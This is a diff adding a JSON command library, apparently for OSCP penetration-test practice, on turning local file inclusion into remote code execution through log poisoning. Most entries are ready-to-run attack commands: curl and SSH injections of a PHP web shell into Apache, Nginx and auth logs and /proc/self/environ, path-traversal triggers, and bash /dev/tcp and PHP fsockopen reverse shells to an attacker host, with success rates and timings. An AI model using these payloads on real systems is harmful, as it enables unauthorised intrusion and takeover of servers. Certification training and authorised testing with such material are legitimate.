@@ -1,0 +1,423 @@
+{
+  "commands": [
+    {
+      "id": "curl-ua-poison-apache",
+      "name": "Apache User-Agent Log Poisoning",
+      "command": "curl -A '<?php system($_GET[\"c\"]); ?>' http://<TARGET>:<PORT>/",
+      "description": "Inject PHP code into Apache access.log via User-Agent header",
+      "tags": [
+        "web",
+        "lfi",
+        "rce",
+        "log-poisoning",
+        "apache"
+      ],
+      "oscp_relevance": "Core LFI-to-RCE technique. Apache logs User-Agent without sanitization by default. Combined with LFI, achieves remote code execution. Common in OSCP (appears in ~30% of web boxes). Fast execution (2-3 minutes total).",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "192.168.45.100",
+          "required": true
+        },
+        {
+          "name": "<PORT>",
+          "description": "Web server port (default: 80 for HTTP, 443 for HTTPS)",
+          "example": "80",
+          "required": false
+        }
+      ],
+      "category": "web",
+      "flag_explanations": {
+        "-A": "User-Agent header. Normally identifies browser/client (e.g., 'Mozilla/5.0'). Apache logs this field by default in Combined Log Format without sanitization. By injecting PHP code here, we poison the log file. When LFI includes the log, PHP interpreter executes our payload. Alternative injection points: Referer (-e flag), Cookie (-H 'Cookie: ...'). User-Agent chosen because: (1) always logged by default Apache config, (2) least likely to break request parsing, (3) no length restrictions in most configs."
+      },
+      "alternatives": [
+        "lfi-access-log-apache",
+        "lfi-rce-trigger"
+      ],
+      "success_indicators": [
+        "HTTP 200 response (page loads normally)",
+        "PHP code visible in log file when read via LFI",
+        "curl 'http://<TARGET>/page.php?file=../../../../var/log/apache2/access.log' | grep '<?php' shows payload"
+      ],
+      "failure_indicators": [
+        "403 Forbidden (WAF blocking User-Agent modification)",
+        "Log not readable (permissions issue)",
+        "Empty log file or permission denied on LFI read"
+      ],
+      "notes": "Manual alternative: Use netcat to send raw HTTP request: echo -e 'GET / HTTP/1.1\\r\\nHost: <TARGET>\\r\\nUser-Agent: <?php system($_GET[\"c\"]); ?>\\r\\n\\r\\n' | nc <TARGET> <PORT>. Timing: 1-2 minutes for poisoning. Add 2-3 minutes for LFI trigger and shell upgrade. Total: 3-5 minutes. Success rate: High (70-80% when LFI confirmed and logs accessible).",
+      "next_steps": [
+        "Trigger RCE: curl 'http://<TARGET>/page.php?file=../../../../var/log/apache2/access.log&c=whoami'",
+        "Verify execution: Look for command output in response (often buried in log noise)",
+        "Establish reverse shell: Use c=bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' parameter",
+        "If system() blocked: Try exec(), passthru(), shell_exec(), popen() in payload"
+      ],
+      "prerequisites": [],
+      "troubleshooting": {}
+    },
+    {
+      "id": "curl-ua-poison-nginx",
+      "name": "Nginx User-Agent Log Poisoning",
+      "command": "curl -A '<?php system($_GET[\"c\"]); ?>' http://<TARGET>:<PORT>/",
+      "description": "Inject PHP code into Nginx access.log via User-Agent header (Nginx variant)",
+      "tags": [
+        "web",
+        "lfi",
+        "rce",
+        "log-poisoning",
+        "nginx"
+      ],
+      "oscp_relevance": "Nginx becoming more common in OSCP (20-25% of web boxes). Technique identical to Apache, but different log paths and permissions. Nginx worker runs as 'nginx' or 'www-data' depending on distro. Understanding platform differences critical for exam success.",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "192.168.45.100",
+          "required": true
+        },
+        {
+          "name": "<PORT>",
+          "description": "Web server port (default: 80 for HTTP, 443 for HTTPS)",
+          "example": "80",
+          "required": false
+        }
+      ],
+      "flag_explanations": {
+        "-A": "User-Agent header injection (same as Apache). Nginx difference: Default log format includes User-Agent as '$http_user_agent' variable. Nginx Combined Log Format: '$remote_addr - $remote_user [$time_local] \"$request\" $status $body_bytes_sent \"$http_referer\" \"$http_user_agent\"'. No sanitization occurs - direct string interpolation. Key difference from Apache: Nginx allows custom log formats, so User-Agent logging might be disabled (check nginx.conf). If disabled, try Referer header instead."
+      },
+      "next_steps": [
+        "Detect Nginx: curl -I http://<TARGET>:<PORT>/ | grep Server",
+        "Enumerate log path: Try /var/log/nginx/access.log, then /var/log/nginx/<VHOST>_access.log if multi-vhost setup",
+        "Check worker user: Use LFI to read /etc/nginx/nginx.conf, look for 'user' directive",
+        "Trigger RCE: curl 'http://<TARGET>/vuln.php?page=../../../../var/log/nginx/access.log&c=id'",
+        "If permission denied: Try error.log instead (often more permissive)"
+      ],
+      "category": "web",
+      "notes": "Manual alternative: Raw HTTP via netcat (same as Apache variant). Or use telnet: telnet <TARGET> <PORT>, then manually type: GET / HTTP/1.1<ENTER>Host: <TARGET><ENTER>User-Agent: <?php system($_GET[\"c\"]); ?><ENTER><ENTER> Success rate: Medium-High (60-70%). Lower than Apache because: (1) Nginx admins more likely to customize log format, (2) SELinux/AppArmor more common on Nginx setups, (3) User-Agent logging sometimes disabled for performance. Higher success on default Nginx installs. Timing: 2-3 minutes (slightly longer than Apache due to path/user enumeration). Add 1 minute for initial Nginx vs Apache detection.",
+      "alternatives": [],
+      "success_indicators": [],
+      "failure_indicators": [],
+      "prerequisites": [],
+      "troubleshooting": {}
+    },
+    {
+      "id": "lfi-access-log-apache",
+      "name": "LFI Read Apache Access Log",
+      "command": "curl 'http://<TARGET>:<PORT>/<LFI_PARAM>?<PARAM>=../../../../var/log/apache2/access.log'",
+      "description": "Use LFI vulnerability to read Apache access.log (for verification or RCE trigger)",
+      "tags": [
+        "web",
+        "lfi",
+        "log-poisoning",
+        "apache",
+        "enumeration"
+      ],
+      "oscp_relevance": "Two-phase usage: (1) Verify log is readable before poisoning (saves time), (2) Trigger RCE after poisoning. Exam efficiency critical - test access before wasting time on poisoning. Common mistake: Poisoning log that LFI can't access.",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "192.168.45.100",
+          "required": true
+        },
+        {
+          "name": "<PORT>",
+          "description": "Web server port",
+          "example": "80",
+          "required": false
+        },
+        {
+          "name": "<LFI_PARAM>",
+          "description": "Vulnerable PHP file containing LFI",
+          "example": "index.php",
+          "required": true
+        },
+        {
+          "name": "<PARAM>",
+          "description": "Vulnerable parameter name (e.g., page, file, include)",
+          "example": "page",
+          "required": true
+        }
+      ],
+      "flag_explanations": {},
+      "next_steps": [
+        "If successful: Proceed with User-Agent poisoning (curl-ua-poison-apache)",
+        "If permission denied: Try alternative logs (error.log, /var/log/auth.log, /var/log/syslog)",
+        "If wrong path: Try CentOS variant (/var/log/httpd/access_log), vhost-specific logs",
+        "Alternative technique: /proc/self/environ if all logs fail"
+      ],
+      "category": "web",
+      "notes": "Manual alternative: Use browser: Navigate to http://<TARGET>/<LFI_PARAM>?<PARAM>=../../../../var/log/apache2/access.log directly. Advantage: See formatted output with syntax highlighting extensions. Disadvantage: Browser modifies User-Agent (harder to control payload injection). For exam: curl preferred (scriptable, exact control). Success rate: Medium (50-60%). Many modern setups restrict log permissions (640 root:adm). Default Apache on older Ubuntu (<=16.04) often world-readable (644). OSCP boxes tend toward permissive configs for challenge purposes. Timing: 30 seconds to 1 minute (quick verification step before poisoning).",
+      "alternatives": [],
+      "success_indicators": [],
+      "failure_indicators": [],
+      "prerequisites": [],
+      "troubleshooting": {}
+    },
+    {
+      "id": "lfi-access-log-nginx",
+      "name": "LFI Read Nginx Access Log",
+      "command": "curl 'http://<TARGET>:<PORT>/<LFI_PARAM>?<PARAM>=../../../../var/log/nginx/access.log'",
+      "description": "Use LFI vulnerability to read Nginx access.log (for verification or RCE trigger)",
+      "tags": [
+        "web",
+        "lfi",
+        "log-poisoning",
+        "nginx",
+        "enumeration"
+      ],
+      "oscp_relevance": "Nginx-specific variant of Apache log reading. Path differences critical: /var/log/nginx/ vs /var/log/apache2/. Multi-vhost Nginx setups often use named logs (/var/log/nginx/<DOMAIN>_access.log) - requires enumeration. OSCP scenario: Default configs more common, but knowing variants saves time.",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "192.168.45.100",
+          "required": true
+        },
+        {
+          "name": "<PORT>",
+          "description": "Web server port",
+          "example": "80",
+          "required": false
+        },
+        {
+          "name": "<LFI_PARAM>",
+          "description": "Vulnerable PHP file containing LFI",
+          "example": "index.php",
+          "required": true
+        },
+        {
+          "name": "<PARAM>",
+          "description": "Vulnerable parameter name",
+          "example": "file",
+          "required": true
+        }
+      ],
+      "flag_explanations": {},
+      "next_steps": [
+        "If successful: Poison via curl-ua-poison-nginx",
+        "If permission denied: Try /var/log/nginx/error.log (different permissions)",
+        "If multi-vhost suspected: Enumerate vhost names, try <VHOST>_access.log pattern",
+        "Nginx-specific alternative: /var/log/nginx/<VHOST>.access.log (dot separator used by some configs)"
+      ],
+      "category": "web",
+      "notes": "Manual alternative: Browser-based testing (same as Apache). For multi-vhost enumeration: Use gobuster/wfuzz to fuzz vhost names, then try /var/log/nginx/<VHOST>_access.log. Example: wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://<TARGET>/index.php?file=../../../../var/log/nginx/FUZZ_access.log' --hh 0 Success rate: Medium (50-60%, similar to Apache). Nginx advantage: error.log often 644 permissions (more permissive than Apache error.log which is typically 640). Timing: 1 minute (includes Nginx detection + log path enumeration).",
+      "alternatives": [],
+      "success_indicators": [],
+      "failure_indicators": [],
+      "prerequisites": [],
+      "troubleshooting": {}
+    },
+    {
+      "id": "ssh-authlog-poison",
+      "name": "SSH Auth Log Poisoning via Failed Login",
+      "command": "ssh '<?php system($_GET[\"c\"]); ?>'@<TARGET>",
+      "description": "Poison /var/log/auth.log by injecting PHP code into SSH username field (failed login technique)",
+      "tags": [
+        "web",
+        "lfi",
+        "rce",
+        "log-poisoning",
+        "ssh",
+        "alternative"
+      ],
+      "oscp_relevance": "Critical alternative when web logs not accessible. SSH logs to /var/log/auth.log, which is often more permissive (readable by syslog group, www-data sometimes member). OSCP frequency: Medium (15-20% of LFI challenges require this when Apache/Nginx logs fail). Failed login intentional - we want payload logged, not actual authentication.",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address",
+          "example": "192.168.45.100",
+          "required": true
+        }
+      ],
+      "flag_explanations": {},
+      "next_steps": [
+        "Verify SSH open: nmap -p 22 <TARGET> (should show 22/tcp open ssh)",
+        "Verify log readable: curl 'http://<TARGET>/vuln.php?page=../../../../var/log/auth.log' | grep sshd",
+        "Trigger RCE: curl 'http://<TARGET>/vuln.php?page=../../../../var/log/auth.log&c=whoami'",
+        "Look for output near: 'Failed password for <?php system($_GET[\"c\"]); ?>' log entry",
+        "If output not visible: Log noise high in auth.log - grep for your IP to find relevant section"
+      ],
+      "category": "web",
+      "notes": "Manual alternative: If SSH client rejects PHP payload (some clients validate username format): Use raw TCP socket. Python one-liner: python3 -c \"import socket; s=socket.socket(); s.connect(('<TARGET>',22)); s.recv(1024); s.send(b'SSH-2.0-OpenSSH_8.0\\r\\n'); s.send(b'<?php system(\\$_GET[\\\"c\\\"]); ?>\\r\\n')\" (less reliable but bypasses client validation). Success rate: High (70-80% when SSH exposed and auth.log readable). Advantages over web log poisoning: (1) auth.log often group-readable (syslog group), (2) less likely to have SELinux restrictions, (3) works even if no web server running. Disadvantages: (1) Requires SSH port open, (2) generates failed login alerts (stealth concern in real engagements, not OSCP). Timing: 1-2 minutes for poisoning. 30 seconds for SSH detection (nmap). Total: 2-3 minutes.",
+      "alternatives": [],
+      "success_indicators": [],
+      "failure_indicators": [],
+      "prerequisites": [],
+      "troubleshooting": {}
+    },
+    {
+      "id": "lfi-auth-log",
+      "name": "LFI Read SSH Auth Log",
+      "command": "curl 'http://<TARGET>:<PORT>/<LFI_PARAM>?<PARAM>=../../../../var/log/auth.log'",
+      "description": "Use LFI to read /var/log/auth.log (SSH authentication log) for verification or RCE trigger",
+      "tags": [
+        "web",
+        "lfi",
+        "log-poisoning",
+        "ssh",
+        "enumeration"
+      ],
+      "oscp_relevance": "Pre-check before SSH log poisoning. Verifies: (1) auth.log exists, (2) readable by www-data, (3) SSH logging enabled. Common in OSCP when web logs fail. Auth.log contains: SSH logins, sudo attempts, cron jobs, user switches - useful for enumeration even without poisoning.",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address",
+          "example": "192.168.45.100",
+          "required": true
+        },
+        {
+          "name": "<PORT>",
+          "description": "Web server port",
+          "example": "80",
+          "required": false
+        },
+        {
+          "name": "<LFI_PARAM>",
+          "description": "Vulnerable PHP file",
+          "example": "page.php",
+          "required": true
+        },
+        {
+          "name": "<PARAM>",
+          "description": "Vulnerable parameter name",
+          "example": "file",
+          "required": true
+        }
+      ],
+      "flag_explanations": {},
+      "next_steps": [
+        "If readable: Proceed with ssh-authlog-poison",
+        "If permission denied: Check /var/log/syslog (sometimes more permissive, includes auth events)",
+        "Enumeration bonus: Extract usernames from 'Accepted password for <user>' entries",
+        "RHEL/CentOS variant: Try /var/log/secure instead of auth.log"
+      ],
+      "category": "web",
+      "notes": "Manual alternative: Browser-based or use wget: wget -q -O - 'http://<TARGET>/<LFI_PARAM>?<PARAM>=../../../../var/log/auth.log' (wget advantage: saves to file for offline analysis). Success rate: Medium-High (60-70%). auth.log often more permissive than web logs. Default permissions: 640 root:adm, but www-data sometimes in adm group (Ubuntu Server default) or syslog group. Timing: 30 seconds (quick verification).",
+      "alternatives": [],
+      "success_indicators": [],
+      "failure_indicators": [],
+      "prerequisites": [],
+      "troubleshooting": {}
+    },
+    {
+      "id": "lfi-proc-environ",
+      "name": "LFI Read /proc/self/environ",
+      "command": "curl -A '<?php system($_GET[\"c\"]); ?>' 'http://<TARGET>:<PORT>/<LFI_PARAM>?<PARAM>=../../../../proc/self/environ'",
+      "description": "Advanced log poisoning via /proc/self/environ - poison environment variables and trigger RCE",
+      "tags": [
+        "web",
+        "lfi",
+        "rce",
+        "log-poisoning",
+        "proc",
+        "advanced"
+      ],
+      "oscp_relevance": "Advanced technique when all log files fail. /proc/self/environ contains environment variables of current PHP process, including HTTP headers. By poisoning User-Agent (becomes HTTP_USER_AGENT env var), we inject code. Less common in OSCP (10-15%) but high-value when it works. Demonstrates deeper Linux knowledge.",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address",
+          "example": "192.168.45.100",
+          "required": true
+        },
+        {
+          "name": "<PORT>",
+          "description": "Web server port",
+          "example": "80",
+          "required": false
+        },
+        {
+          "name": "<LFI_PARAM>",
+          "description": "Vulnerable PHP file",
+          "example": "index.php",
+          "required": true
+        },
+        {
+          "name": "<PARAM>",
+          "description": "Vulnerable parameter name",
+          "example": "page",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "-A": "User-Agent header becomes HTTP_USER_AGENT environment variable in PHP process. When we include /proc/self/environ via LFI, this variable (with our payload) is parsed by PHP interpreter. Critical: Must poison in SAME REQUEST as LFI (curl -A sets header for that specific request). Advantage over log poisoning: No permission issues - /proc always readable. Disadvantage: Must include /proc/self/environ in same request that contains payload (log poisoning allows separation of injection and trigger)."
+      },
+      "next_steps": [
+        "Verify /proc readable: curl 'http://<TARGET>/vuln.php?page=../../../../proc/self/cmdline' (should show PHP command)",
+        "Poison and trigger in same request (already done by command above)",
+        "Add RCE parameter: Append '&c=id' to URL",
+        "Parse output: Look for command result near HTTP_USER_AGENT variable",
+        "If fails: Check /proc/self/fd/ directory (alternative proc technique)"
+      ],
+      "category": "web",
+      "notes": "Manual alternative: Two-step approach using telnet: (1) telnet <TARGET> <PORT>, (2) Manually type: GET /<LFI_PARAM>?<PARAM>=../../../../proc/self/environ HTTP/1.1<ENTER>Host: <TARGET><ENTER>User-Agent: <?php system($_GET[\"c\"]); ?><ENTER><ENTER>. Same result, more control over exact request format. Success rate: Medium (50-60%). Works when: (1) /proc filesystem mounted, (2) PHP not in strict safe_mode. Fails when: (1) Docker/container with --security-opt no-new-privileges, (2) /proc mounted with hidepid=2 option (paranoid security), (3) PHP CGI mode (different process context). Success rate lower than log poisoning but critical fallback. Timing: 2-3 minutes (includes understanding /proc output format). Faster if familiar with technique.",
+      "alternatives": [],
+      "success_indicators": [],
+      "failure_indicators": [],
+      "prerequisites": [],
+      "troubleshooting": {}
+    },
+    {
+      "id": "lfi-rce-trigger",
+      "name": "LFI Trigger RCE After Log Poisoning",
+      "command": "curl 'http://<TARGET>:<PORT>/<LFI_PARAM>?<PARAM>=../../../../var/log/apache2/access.log&c=<COMMAND>'",
+      "description": "Trigger remote code execution via poisoned log file (second phase after successful poisoning)",
+      "tags": [
+        "web",
+        "lfi",
+        "rce",
+        "log-poisoning",
+        "exploitation"
+      ],
+      "oscp_relevance": "Second phase of log poisoning attack. First phase: inject payload via curl-ua-poison-apache. Second phase: trigger execution via this command. Understanding two-phase nature critical for OSCP - many students poison successfully but fail to trigger. This command demonstrates the full attack chain.",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address",
+          "example": "192.168.45.100",
+          "required": true
+        },
+        {
+          "name": "<PORT>",
+          "description": "Web server port",
+          "example": "80",
+          "required": false
+        },
+        {
+          "name": "<LFI_PARAM>",
+          "description": "Vulnerable PHP file",
+          "example": "page.php",
+          "required": true
+        },
+        {
+          "name": "<PARAM>",
+          "description": "Vulnerable parameter name",
+          "example": "file",
+          "required": true
+        },
+        {
+          "name": "<COMMAND>",
+          "description": "System command to execute (e.g., whoami, id, 'ls -la', reverse shell)",
+          "example": "whoami",
+          "required": true
+        }
+      ],
+      "flag_explanations": {},
+      "next_steps": [
+        "Verify RCE: Start with simple command (whoami, id, pwd)",
+        "Enumerate restrictions: &c='cat /etc/php/7.4/apache2/php.ini | grep disable_functions'",
+        "Reverse shell (Bash): &c='bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'",
+        "If bash blocked: Try PHP reverse shell: &c='php -r \"$sock=fsockopen(\"<LHOST>\",<LPORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");\"'",
+        "URL encode complex commands: Use Burp Decoder or: python3 -c 'import urllib.parse; print(urllib.parse.quote(\"<COMMAND>\"))'"
+      ],
+      "category": "web",
+      "notes": "Manual alternative: Browser-based for simple commands: Navigate to http://<TARGET>/<LFI_PARAM>?<PARAM>=../../../../var/log/apache2/access.log&c=whoami. For complex commands (reverse shells with special chars): Use Burp Suite Repeater to avoid URL encoding issues. Best practice: URL-encode <COMMAND> for reliability (bash -c becomes bash%20-c). Success rate: Very High (90-95% after successful poisoning). Main failure point is earlier (poisoning/log access), not execution. If you reach this step, RCE almost guaranteed unless PHP restrictions present. Timing: 30 seconds per command test. 2-3 minutes for reverse shell establishment.",
+      "alternatives": [],
+      "success_indicators": [],
+      "failure_indicators": [],
+      "prerequisites": [],
+      "troubleshooting": {}
+    }
+  ]
+}
